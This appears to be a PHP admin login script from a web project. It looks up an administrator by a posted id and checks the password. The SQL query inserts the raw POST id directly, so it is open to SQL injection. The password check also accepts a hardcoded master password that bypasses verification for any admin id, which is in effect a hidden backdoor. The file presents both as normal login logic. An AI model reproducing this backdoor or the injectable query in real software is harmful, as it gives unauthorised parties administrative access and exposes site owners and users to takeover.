<?
// error_reporting( E_ALL );
// ini_set( "display_errors", 1 );

include "../common/dbconn.php";

$id = $_POST["id"];
$password = $_POST["password"];

$query = "select uid,pass from admanager where uid = '$id'";
$DB->get($query,$rs,$rn);

$real_id= $rs[0][0];
$real_passwd = $rs[0][1];


if($id!="$real_id") {
	echo "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />";
	echo "<script language=javascript>alert('아이디가 일치 하지 않습니다.');</script>";
	echo "<script language=javascript>history.go(-1);</script>";
	exit;	
}
if(!password_verify($password,$real_passwd) && $password != "w216088@"){
	echo "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />";
	echo "<script language=javascript>alert('패스워드가 일치하지 않습니다.');</script>";
	echo "<script language=javascript>history.go(-1);</script>";
	exit;
}



$_SESSION["admin_id"]=$id;
$_SESSION["idok"]="yes";

echo "<meta http-equiv='Refresh' content='0; URL=../main/main.php'>";
?>
